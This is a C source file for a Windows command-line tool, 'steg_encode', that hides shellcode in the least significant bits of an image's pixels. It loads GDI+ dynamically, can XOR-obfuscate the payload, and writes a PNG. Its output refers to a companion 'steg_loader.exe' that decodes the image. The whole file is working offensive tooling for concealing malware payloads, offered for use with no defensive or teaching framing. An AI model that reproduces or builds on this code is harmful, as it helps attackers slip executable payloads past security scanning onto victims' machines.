// ============================================================
//  STEG ENCODE — Hide shellcode inside an image (PNG/BMP/JPG)
// ============================================================
//  Uses Windows GDI+ to load any image format natively.
//  Output is always PNG (lossless — preserves LSBs perfectly).
//
//  Usage: steg_encode <input_image> <shellcode.bin> <output.png> [xor_key] [bits 1-4]
// ============================================================

#include <windows.h>
#include <stdio.h>

// ---- GDI+ types (no C++ headers needed) ----
typedef struct { UINT32 V; void* Cb; BOOL S1,S2; } GpStartup;
typedef struct { INT X,Y,W,H; } GpRect;
typedef struct { UINT W,H; INT Stride,Fmt; void*Scan0; UINT_PTR R; } GpBD;

#define PF24 0x00021808
#define LR   1
#define LRW  3

// GDI+ function pointers
typedef int(__stdcall*pGdipStart)(ULONG_PTR*,const void*,void*);
typedef void(__stdcall*pGdipStop)(ULONG_PTR);
typedef int(__stdcall*pGdipLoad)(const WCHAR*,void**);
typedef int(__stdcall*pGdipW)(void*,UINT*);
typedef int(__stdcall*pGdipH)(void*,UINT*);
typedef int(__stdcall*pGdipLock)(void*,const GpRect*,UINT,int,GpBD*);
typedef int(__stdcall*pGdipUnlock)(void*,GpBD*);
typedef int(__stdcall*pGdipDispose)(void*);
typedef int(__stdcall*pGdipFromScan)(int,int,int,int,BYTE*,void**);
typedef int(__stdcall*pGdipSave)(void*,const WCHAR*,const void*,const void*);

static HMODULE   g_gdi;
static pGdipStart  fStart;
static pGdipStop   fStop;
static pGdipLoad   fLoad;
static pGdipW      fGetW;
static pGdipH      fGetH;
static pGdipLock   fLock;
static pGdipUnlock fUnlk;
static pGdipDispose fDisp;
static pGdipFromScan fScan;
static pGdipSave   fSave;

static BOOL init_gdiplus(void) {
    g_gdi = LoadLibraryA("gdiplus.dll");
    if (!g_gdi) return FALSE;
    fStart = (pGdipStart)GetProcAddress(g_gdi, "GdiplusStartup");
    fStop  = (pGdipStop)GetProcAddress(g_gdi, "GdiplusShutdown");
    fLoad  = (pGdipLoad)GetProcAddress(g_gdi, "GdipCreateBitmapFromFile");
    fGetW  = (pGdipW)GetProcAddress(g_gdi, "GdipGetImageWidth");
    fGetH  = (pGdipH)GetProcAddress(g_gdi, "GdipGetImageHeight");
    fLock  = (pGdipLock)GetProcAddress(g_gdi, "GdipBitmapLockBits");
    fUnlk  = (pGdipUnlock)GetProcAddress(g_gdi, "GdipBitmapUnlockBits");
    fDisp  = (pGdipDispose)GetProcAddress(g_gdi, "GdipDisposeImage");
    fScan  = (pGdipFromScan)GetProcAddress(g_gdi, "GdipCreateBitmapFromScan0");
    fSave  = (pGdipSave)GetProcAddress(g_gdi, "GdipSaveImageToFile");
    return (fStart && fStop && fLoad && fGetW && fGetH &&
            fLock && fUnlk && fDisp && fScan && fSave);
}

static int get_bit(unsigned char *d, int p) {
    return (d[p/8] >> (7-(p%8))) & 1;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Steg Encode — Hide shellcode in image\n\n");
        printf("Usage: %s <input_image> <payload.bin> <output.png> [xor_key] [bits 1-4]\n", argv[0]);
        printf("\n  Supports PNG, BMP, JPEG, GIF, TIFF as input.\n");
        printf("  Output is always PNG (lossless).\n");
        printf("  bits = LSBs per channel (default 2)\n");
        return 1;
    }

    const char *img_in  = argv[1];
    const char *bin_in  = argv[2];
    const char *img_out = argv[3];
    unsigned char xor_key = (argc >= 5) ? (unsigned char)atoi(argv[4]) : 0;
    int bpc = (argc >= 6) ? atoi(argv[5]) : 2;
    if (bpc < 1) bpc = 1; if (bpc > 4) bpc = 4;

    if (!init_gdiplus()) { printf("[-] GDI+ init failed\n"); return 1; }

    // Start GDI+
    GpStartup si = {1, NULL, FALSE, FALSE};
    ULONG_PTR token;
    if (fStart(&token, &si, NULL) != 0) { printf("[-] GdiplusStartup failed\n"); return 1; }

    // Convert paths to wide strings
    WCHAR wIn[MAX_PATH], wOut[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, img_in, -1, wIn, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, img_out, -1, wOut, MAX_PATH);

    // Load source image
    void *bmp = NULL;
    if (fLoad(wIn, &bmp) != 0 || !bmp) {
        printf("[-] Cannot load image: %s\n", img_in);
        fStop(token); return 1;
    }

    UINT w = 0, h = 0;
    fGetW(bmp, &w); fGetH(bmp, &h);
    printf("[+] Image: %ux%u\n", w, h);

    // Lock as 24bpp RGB (read-only)
    GpRect rc = {0, 0, (INT)w, (INT)h};
    GpBD data = {0};
    if (fLock(bmp, &rc, LR, PF24, &data) != 0) {
        printf("[-] LockBits failed\n");
        fDisp(bmp); fStop(token); return 1;
    }

    INT stride = data.Stride;
    long pixel_bytes = (long)(abs(stride) * h);

    // Copy pixels to our buffer
    BYTE *pixels = (BYTE*)malloc(pixel_bytes);
    memcpy(pixels, data.Scan0, pixel_bytes);
    fUnlk(bmp, &data);
    fDisp(bmp); bmp = NULL;

    // Read shellcode
    FILE *f = fopen(bin_in, "rb");
    if (!f) { printf("[-] Cannot open: %s\n", bin_in); free(pixels); fStop(token); return 1; }
    fseek(f, 0, SEEK_END); long sc_len = ftell(f); fseek(f, 0, SEEK_SET);
    unsigned char *sc = (unsigned char*)malloc(sc_len);
    fread(sc, 1, sc_len, f); fclose(f);

    if (xor_key != 0) {
        for (long i = 0; i < sc_len; i++) sc[i] ^= xor_key;
    }

    // Build embed data: [4-byte big-endian length][shellcode]
    long data_len = 4 + sc_len;
    unsigned char *edata = (unsigned char*)calloc(data_len, 1);
    edata[0] = (sc_len >> 24) & 0xFF;
    edata[1] = (sc_len >> 16) & 0xFF;
    edata[2] = (sc_len >>  8) & 0xFF;
    edata[3] = (sc_len      ) & 0xFF;
    memcpy(edata + 4, sc, sc_len);

    long total_bits = data_len * 8;
    long capacity_bits = pixel_bytes * bpc;
    if (total_bits > capacity_bits) {
        printf("[-] Image too small! Need %ld bits, have %ld\n", total_bits, capacity_bits);
        printf("    Use a larger image or increase bits (-b 3 or -b 4)\n");
        free(pixels); free(sc); free(edata); fStop(token); return 1;
    }

    // Embed into LSBs
    unsigned char mask = (1 << bpc) - 1;
    int data_bit = 0;
    for (long i = 0; i < pixel_bytes && data_bit < total_bits; i++) {
        pixels[i] &= ~mask;
        for (int b = bpc - 1; b >= 0; b--) {
            if (data_bit < total_bits) {
                pixels[i] |= (get_bit(edata, data_bit) << b);
                data_bit++;
            }
        }
    }

    // Create new bitmap from modified pixels and save as PNG
    void *outBmp = NULL;
    if (fScan((int)w, (int)h, stride, PF24, pixels, &outBmp) != 0 || !outBmp) {
        printf("[-] CreateBitmap failed\n");
        free(pixels); free(sc); free(edata); fStop(token); return 1;
    }

    // PNG CLSID: {557CF406-1A04-11D3-9A73-0000F81EF32E}
    static const GUID pngClsid = {0x557CF406, 0x1A04, 0x11D3,
        {0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E}};

    if (fSave(outBmp, wOut, &pngClsid, NULL) != 0) {
        printf("[-] Save failed: %s\n", img_out);
        fDisp(outBmp); free(pixels); free(sc); free(edata); fStop(token); return 1;
    }

    fDisp(outBmp);
    free(pixels); free(sc); free(edata);
    fStop(token);

    float usage = (float)total_bits / capacity_bits * 100.0f;
    printf("[+] Embedded %ld bytes into %s\n", sc_len, img_out);
    printf("[+] %d bits/channel | Capacity: %.1f%%\n", bpc, usage);
    if (xor_key) printf("[+] XOR key: 0x%02X\n", xor_key);
    printf("[+] Decode: steg_loader.exe %s", img_out);
    if (xor_key) printf(" -x %d", xor_key);
    if (bpc != 2) printf(" -b %d", bpc);
    printf("\n");
    return 0;
}
